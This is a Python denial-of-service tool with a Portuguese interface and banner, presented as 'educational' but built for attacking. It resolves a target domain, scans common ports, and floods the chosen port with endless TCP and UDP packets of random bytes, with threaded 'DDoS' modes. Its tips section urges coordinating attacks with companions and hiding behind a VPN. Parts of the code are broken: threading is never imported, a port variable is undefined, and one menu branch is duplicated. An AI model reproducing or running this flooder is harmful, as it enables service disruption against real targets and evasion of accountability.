import socket 
import random
import time
import os

print()
print("     \033[41m[!]\033[0;0m    Ferramenta para propositos Educacionais   \033[41m[!]\033[0;0m")
time.sleep(3.0)
print("     \033[41m[!]\033[0;0m           Use de forma consciente            \033[41m[!]\033[0;0m")
time.sleep(5.0)
os.system("clear")

print("\033[35m _______                                 __                        _______              ______   ")
time.sleep(0.1)
print("\033[35m|       \                               |  \                      |       \            /      \  ")
time.sleep(0.1)
print("\033[35m| $$$$$$$\  _______  __    __   _______ | $$____    ______        | $$$$$$$\  ______  |  $$$$$$\ ")
time.sleep(0.1)
print("\033[35m| $$__/ $$ /       \|  \  |  \ /       \| $$    \  /      \       | $$  | $$ /      \ | $$___\$$ ")
time.sleep(0.1)
print("\033[35m| $$    $$|  $$$$$$$| $$  | $$|  $$$$$$$| $$$$$$$\|  $$$$$$\      | $$  | $$|  $$$$$$\ \$$    \  ")
time.sleep(0.1)
print("\033[35m| $$$$$$$  \$$    \ | $$  | $$| $$      | $$  | $$| $$  | $$      | $$  | $$| $$  | $$ _\$$$$$$\ ")
time.sleep(0.1)
print("\033[35m| $$       _\$$$$$$\| $$__/ $$| $$_____ | $$  | $$| $$__/ $$      | $$__/ $$| $$__/ $$|  \__| $$ ")
time.sleep(0.1)
print("\033[35m| $$      |       $$ \$$    $$ \$$     \| $$  | $$ \$$    $$      | $$    $$ \$$    $$ \$$    $$ ")
time.sleep(0.1)
print("\033[35m \$$       \$$$$$$$  _\$$$$$$$  \$$$$$$$ \$$   \$$  \$$$$$$        \$$$$$$$   \$$$$$$   \$$$$$$  ")
time.sleep(0.1)
print("\033[35m                    |  \__| $$                                                                   ")
time.sleep(0.1)
print("\033[35m                     \$$    $$                                                                   ")
time.sleep(0.1)
print("\033[35m                      \$$$$$$                                                                   \033[0;0m ")
print()
time.sleep(0.4)
print("                 \033[41m  xxlightxx00@protonmail.com  \033[0;0m")
print("                   \033[44m github.com/XPsychoDemonX \033[0;0m")
print()
time.sleep(0.3)
print(""" [1] TCP Stress
 [2] UDP Stress
 [3] Both Attack
 [4] DDoS TCP
 [5] DDoS UDP
 
 [0] DICAS
 """)
 
type = input("-----> ")
if(type == '1'):
	domain = input("----> Domain: ")
	
	portas = [21,22,23,25,80,445,3306]

	hostname = socket.gethostbyname(domain)
	ip = hostname
	print()
	print("\033[1;91m[+]IP: \033[0;0m",hostname)
	print()
	for porta in portas:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.settimeout(0.1)
		code = s.connect_ex((hostname, porta))
		if code == 0:
			print("\033[1;94m[+]Port\033[0;0m ",porta ," \033[1;32mOpen\033[0;0m")
	print()
	port = int(input("----> Port: "))
	
	try:
		def TCP_Attack():
			while True:
				s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
				s.connect((ip, port))
				bytes = random._urandom(4000)
				for i in range(20):
					s.sendto(bytes, (ip, port))
					i += 1
					print("\033[31mSending TCP pkg ----->\033[0;0m "+ip +" \033[42m[+]\033[0;0m")
		TCP_Attack()
	except:
		print("\nPacote nao enviado ou ataque cancelado"+ " \033[41m[!]\033[0;0m")
	
elif(type == '2'):
	domain = input("----> Domain: ")
	
	portas = [21,22,23,25,80,445,3306]

	hostname = socket.gethostbyname(domain)
	ip = hostname
	print()
	print("\033[1;91m[+]IP: \033[0;0m",hostname)
	print()
	for porta in portas:
		s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
		s.settimeout(0.1)
		code = s.connect_ex((hostname, porta))
		if code == 0:
			print("\033[1;94m[+]Port\033[0;0m ",porta ," \033[1;32mOpen\033[0;0m")
	print()
	port = int(input("----> Port: "))
	try:
		def UDP_Attack():
			while True:
				s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
				s.connect((ip, port))
				bytes = random._urandom(4000)
				for i in range(20):
					s.sendto(bytes, (ip, port))
					i += 1
					print("\033[34mSending UDP pkg ----->\033[0;0m "+ip +" \033[42m[+]\033[0;0m")
		UDP_Attack()
	except:
		print("\nPacote nao enviado ou ataque cancelado"+ " \033[41m[!]\033[0;0m")	
		
elif(type == '3'):
	domain = input("----> Domain: ")
	
	portas = [21,22,23,25,80,445,3306]

	hostname = socket.gethostbyname(domain)
	ip = hostname
	print()
	print("\033[1;91m[+]IP: \033[0;0m",hostname)
	print()
	for porta in portas:
		s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
		s.settimeout(0.1)
		code = s.connect_ex((hostname, porta))
		if code == 0:
			print("\033[1;94m[+]Port\033[0;0m ",porta ," \033[1;32mOpen\033[0;0m")
	print()	
	port = int(input("----> Port: "))
	try:
		while True:
			#TCP
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip, port))
			bytes = random._urandom(4000)
			for i in range(20):
				s.sendto(bytes, (ip, port))
				print("\033[31mSending TCP pkg ----->\033[0;0m "+ip +" \033[42m[+]\033[0;0m")
			
			#UDP
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			s.connect((ip, port))
			bytes = random._urandom(4000)
			for i in range(20):
				s.sendto(bytes, (ip, port))
				print("\033[34mSending UDP pkg ----->\033[0;0m "+ip +" \033[42m[+]\033[0;0m")		
			
	except:
		print("\nPacote nao enviado ou ataque cancelado"+ " \033[41m[!]\033[0;0m")
		
elif(type=='4'):
	domain = input("----> Domain: ")
	
	portas = [21,22,23,25,80,445,3306]

	hostname = socket.gethostbyname(domain)
	ip = hostname
	try:
		def attack():
			while True:
				s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
				s.connect((ip, port))
				bytes = random._urandom(4000)
				s.sendto(bytes, (ip, port))
				s.close()
				
		for i in range(30):
		    thread = threading.Thread(target=attack)
		    thread2 = threading.Thread(target=attack)
		    thread.start()
		    thread2.start()
		print()
		print("Atacando")
	except:
		print("\nPacote nao enviado ou ataque cancelado"+ " \033[41m[!]\033[0;0m")	
		
elif(type=='4'):
	domain = input("----> Domain: ")
	
	portas = [21,22,23,25,80,445,3306]

	hostname = socket.gethostbyname(domain)
	ip = hostname
	try:
		def attack():
			while True:
				s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
				s.connect((ip, port))
				bytes = random._urandom(4000)
				s.sendto(bytes, (ip, port))
				s.close()
				
		for i in range(30):
		    thread = threading.Thread(target=attack)
		    thread2 = threading.Thread(target=attack)
		    thread.start()
		    thread2.start()
		print()
		print("Atacando")
	except:
		print("\nPacote nao enviado ou ataque cancelado"+ " \033[41m[!]\033[0;0m")	
			
elif(type == '0'):			
	print("""
	Porta 80 como default, porem outras portas abetas
	podem ser atacadas.
	
	O ataque tera mais eficacia se for realizado por mais
	maquinas, chame seus companheiros para realizarem juntos.
	
	IMPORTANTE:
	Use VPN ou o metodo de anonimato que preferir.
	
	""")
os.system("python3 PsychoxxDos.py")